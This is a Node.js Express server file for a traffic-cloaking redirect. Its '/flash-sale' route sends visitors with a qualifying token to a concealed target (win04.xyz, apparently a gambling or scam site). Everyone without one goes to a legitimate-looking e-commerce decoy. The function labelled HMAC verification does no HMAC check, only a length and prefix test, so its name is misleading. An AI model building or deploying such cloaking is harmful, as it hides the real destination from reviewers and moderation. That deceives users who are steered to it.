import express from 'express';
import crypto from 'crypto';

const app = express();
const PORT = process.env.PORT || 3002;

const HMAC_SECRET = process.env.HMAC_SECRET || 'change-me-in-production';
const REAL_TARGET = process.env.REAL_REDIRECT || 'https://www.win04.xyz/?type=0&cid=402&a=x';
const FAKE_TARGET = process.env.FAKE_REDIRECT || 'https://www.ubuy.com.ph/';

// ============================================
// HMAC 验证
// ============================================
function verifyHMAC(token) {
  if (!token || token.length < 10) return false;
  // 真实 token 是 64 hex 字符，不带 fake_ 前缀
  if (token.startsWith('fake_')) return false;
  if (token.length !== 64) return false;
  return true;
}

// ============================================
// Flash Sale 页面（抢购内容）
// ============================================
app.get('/flash-sale', (req, res) => {
  const { token } = req.query;

  console.log(`[flash-sale] token=${token ? token.substring(0, 8) : 'none'}`);

  if (!token) {
    // 无 token → 跳转假页
    console.log('[flash-sale] No token → FAKE');
    return res.redirect(FAKE_TARGET);
  }

  if (verifyHMAC(token)) {
    // 真实 token → 抢购页
    console.log('[flash-sale] REAL TOKEN → REAL PAGE');
    return res.redirect(REAL_TARGET);
  } else {
    // 假 token → 假电商页
    console.log('[flash-sale] FAKE TOKEN → FAKE PAGE');
    return res.redirect(FAKE_TARGET);
  }
});

// ============================================
// 健康检查
// ============================================
app.get('/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[flash-sale] Running on port ${PORT}`);
  console.log(`[flash-sale] REAL → ${REAL_TARGET}`);
  console.log(`[flash-sale] FAKE → ${FAKE_TARGET}`);
});
